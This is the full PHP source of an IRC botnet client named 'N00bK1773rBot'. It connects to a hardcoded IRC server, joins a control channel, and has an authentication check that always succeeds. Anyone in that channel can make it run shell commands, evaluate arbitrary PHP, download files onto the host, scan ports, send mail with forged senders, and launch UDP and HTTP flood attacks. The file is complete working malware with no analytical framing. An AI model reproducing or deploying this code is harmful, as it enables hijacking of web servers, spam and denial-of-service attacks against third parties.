<?php
	set_time_limit(0);
	error_reporting(0);
 
	class N00bK1773rBot {
		var $config = array(
			"server" => "85.184.249.99",
			"port" => 6668,
			"pass" => "",
			"prefix" => "N00bK1773r|",
			"maxrand" => 10,
			"chan" => "#N00bK1773rAmae",
			"key" => "N00bK1773rX",
			"modes" => "+p",
			"password" => "",
			"trigger" => ".",
			"hostauth" => "*"
		);
		
		function start() {
			if(!($this->conn = fsockopen($this->config['server'], $this->config['port'], $e, $s, 30))) $this->start();
			
			$ident = "N00bK1773r";
			$alph = range("a","z");
			
			for($i = 0; $i < $this->config['maxrand']; $i++) {
				$ident .= $alph[rand(0, 25)];
			}
			
			if(strlen($this->config['pass']) > 0) {
				$this->send("PASS ".$this->config['pass']);
			}
			
			$this->send("USER $ident 127.0.0.1 localhost :$ident");
			$this->set_nick();
			$this->main();
}

	function main() {
		while(!feof($this->conn)) {
			$this->buf = trim(fgets($this->conn, 512));
			$cmd = explode(" ", $this->buf);
			
			if(substr($this->buf, 0, 6) == "PING :") {
				$this->send("PONG :".substr($this->buf, 6));
			}
			
			if(isset($cmd[1]) && $cmd[1] =="001") {
				$this->send("MODE ".$this->nick." ".$this->config['modes']);
				$this->join($this->config['chan'], $this->config['key']);
			}
			
			if(isset($cmd[1]) && $cmd[1]=="433") {
				$this->set_nick();
			}

			if($this->buf != $old_buf) {
				$mcmd = array();
				$msg = substr(strstr($this->buf," :"), 2);
				$msgcmd = explode(" ", $msg);
				$nick = explode("!", $cmd[0]);
				$vhost = explode("@", $nick[1]);
				$vhost = $vhost[1];
				$nick = substr($nick[0], 1);
				$host = $cmd[0];

				if($msgcmd[0] == $this->nick) {
					for($i = 0; $i < count($msgcmd); $i++) {
						$mcmd[$i] = $msgcmd[$i + 1];
					}
				} else {
					for($i = 0; $i < count($msgcmd); $i++) {
						$mcmd[$i] = $msgcmd[$i];
					}
				}
				
				if(count($cmd) > 2) {
					switch($cmd[1]) {
						case "QUIT":
							if($this->is_logged_in($host)) {
								$this->log_out($host);
							}
						break;
						
						case "PART":
							if($this->is_logged_in($host)) {
								$this->log_out($host);
							}
						break;

						case "PRIVMSG":
							if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == "*")) {
								if(substr($mcmd[0], 0, 1) == ".") {
									switch(substr($mcmd[0], 1)) {
										case "user":
											if($mcmd[1] == $this->config['password']) {
												$this->privmsg($this->config['chan'],"[\2Auth\2]: $nick logado!");
												$this->log_in($host);
											} else {
												$this->privmsg($this->config['chan'],"[\2Auth\2]: Senha errada! $nick");
											}
										break;
									}
								}
							} elseif($this->is_logged_in($host)) {
								if(substr($mcmd[0], 0, 1)==".") {
									switch(substr($mcmd[0], 1)) {
										case "restart":
											$this->send("QUIT :restart");
											fclose($this->conn);
											$this->start();
										break;
									
										case "mail":
											if(count($mcmd)>4) {
												$header = "From: <".$mcmd[2].">";
												if(!mail($mcmd[1], $mcmd[3], strstr($msg, $mcmd[4]), $header)) {
													$this->privmsg($this->config['chan'],"[\2MAIL\2]: Mail was send.");
												} else {
													$this->privmsg($this->config['chan'],"[\2MAIL\2]: Mail can't be send. \2".$mcmd[1]."\2");
												}
											}
										break;
										
										case "dns":
											if(isset($mcmd[1])) {
												$ip = explode(".", $mcmd[1]);
												if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) {
													$this->privmsg($this->config['chan'],"[\2DNS\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1]));
												} else {
													$this->privmsg($this->config['chan'],"[\2DNS\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1]));
												}
											}
										break;

										case "url":
											$this->privmsg($this->config['chan'], "[\2URL!\2]: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."]");
										break;
										
										case "bot":
											$this->privmsg($this->config['chan'], "[\2This Bot is made by N00bK1773r.   Version: 2.2\2]");
										break;
										
										case "cmd":
											if(isset($mcmd[1])) {
												$command = substr(strstr($msg, $mcmd[0]), strlen($mcmd[0]) + 1);
												$this->privmsg($this->config['chan'],"[\2CMD\2]: $command");
												$pipe = popen($command, "r");
												
												while(!feof($pipe)) {
													$pbuf = trim(fgets($pipe, 512));
													if($pbuf != NULL) $this->privmsg($this->config['chan']," : $pbuf");
												}
											pclose($pipe);
											}
										break;
										
										case "rndnick":
											$this->set_nick();
										break;
										
										case "sur00t":
											$this->send(strstr($msg, $mcmd[1]));
										break;
										
										case "php":
											$eval = eval(substr(strstr($msg, $mcmd[1]), strlen($mcmd[1])));
										break;
										
										case "exec":
											$command = substr(strstr($msg, $mcmd[0]), strlen($mcmd[0]) + 1);
											$exec = shell_exec($command);
											$ret = explode("\n", $exec);
											$this->privmsg($this->config['chan'], "[\2EXECUTE\2]: $command");
											
											for($i = 0; $i < count($ret); $i++) {
												if($ret[$i] != NULL) {
													$this->privmsg($this->config['chan']," : ".trim($ret[$i]));
												}
											}
										break;
									
										case "pscan":
											if(count($mcmd) > 2) {
												if(fsockopen($mcmd[1], $mcmd[2], $e, $s, 15))
													$this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2open\2");
												else
													$this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2closed\2");
											}
										break;
										
										case "ud.server": 
											if(count($mcmd)>2) {
												$this->config['server'] = $mcmd[1];
												$this->config['port'] = $mcmd[2];
												
												if(isset($mcmcd[3])) {
													$this->config['pass'] = $mcmd[3];
													$this->privmsg($this->config['chan'],"[\2UPDATE\2]: Server trocado para ".$mcmd[1].":".$mcmd[2]." Senha: ".$mcmd[3]);
												} else {
													$this->privmsg($this->config['chan'],"[\2update\2]: Server trocado para ".$mcmd[1].":".$mcmd[2]);
												}
											}
										break;
										
										case "download":
											if(count($mcmd) > 2) {
												if(!$fp = fopen($mcmd[2],"w")) {
													$this->privmsg($this->config['chan'],"[\2DOWNLOAD\2]: Can't download this File.");
												} else {
													if(!$get = file($mcmd[1])) {
														$this->privmsg($this->config['chan'],"[\2DOWNLOAD\2]: Can't download this File.");
													} else {
														for($i = 0; $i <= count($get); $i++) {
															fwrite($fp, $get[$i]);
														}
											
														$this->privmsg($this->config['chan'],"[\2DOWNLOAD\2]: Erfolgreich die Datei \2".$mcmd[2]." heruntergeladen.\2");
													}
											
													fclose($fp);
												}
											}
										break;
										
										case "die":
											$this->send("QUIT :$nick has kill me!");
											fclose($this->conn);
										exit;
										
										case "logout":
											$this->log_out($host);
											$this->privmsg($this->config['chan'],"[\2auth\2]: $nick deslogado!");
										break;

										case "udpflood":
											if(count($mcmd) > 3) {
												$this->udpflood($mcmd[1], $mcmd[2], $mcmd[3]);
											}
										break;
										
										case "openurl":
											if(count($mcmd) > 1) {
												$this->send_http_request($mcmd[1]);
											}
										break;
										
										case "openurlflood":
											if(count($mcmd) > 2) {
												$this->send_http_flood($mcmd[1], $mcmd[2]);
											}
										break;
									}
								}
							}
						break;
					}
				}
			}
			$old_buf = $this->buf;
		}

		$this->start();
	}
	
	function send($msg) {
		fwrite($this->conn, "$msg\r\n");
	}

	function join($chan,$key=NULL) {
		$this->send("JOIN $chan $key");
	}
	
	function privmsg($to, $msg) {
	$this->send("PRIVMSG $to :$msg");
	}
	
	function is_logged_in($host) {
		return 1;
	}
	
	function log_in($host) {
		$this->users[$host] = true;
	}

	function log_out($host) {
		unset($this->users[$host]);
	}

	function set_nick() {
		if(isset($_SERVER['SERVER_SOFTWARE'])) {
			if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']), "apache")) $this->nick = "";
		}
		
		$this->nick .= $this->config['prefix'];
		for($i = 0; $i < $this->config['maxrand']; $i++) $this->nick .= mt_rand(0, 9);
		$this->send("NICK ".$this->nick);
	}
	
	function udpflood($host,$packetsize,$time) {
		$packet = "";
		for($i = 0; $i < $packetsize; $i++) {
			$packet .= chr(mt_rand(1, 256));
		}
		
		$timei = time();
		$i = 0;
		
		while(time()-$timei < $time) {
			$fp = fsockopen("udp://".$host, mt_rand(0, 65535), $e, $s, 1);
			fwrite($fp, $packet);
			fclose($fp);
			$i++;
		}
		
		$env = $i * $packetsize;
		$env = $env / 1048576;
		$vel = $env / $time;
		$vel = round($vel);
		$env = round($env);
		$this->privmsg($this->config['chan'],"[\2UdpFlood Finished!\2]: $env MB enviados / Media: $vel MB/s ");
	}
	
	function send_http_flood($url, $time) {
		$EndTime = time() + $time;
		while(time() < $EndTime) {
			send_http_request($url);
		}
	}
	
	function send_http_request($url) {
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1);
		curl_setopt($ch, CURLOPT_TIMEOUT, 1);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_NOBODY, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_exec($ch);
		curl_close($ch);
	}
}
 
$N00bK1773rBotx = new N00bK1773rBot;
$N00bK1773rBotx->start();
 
?>
================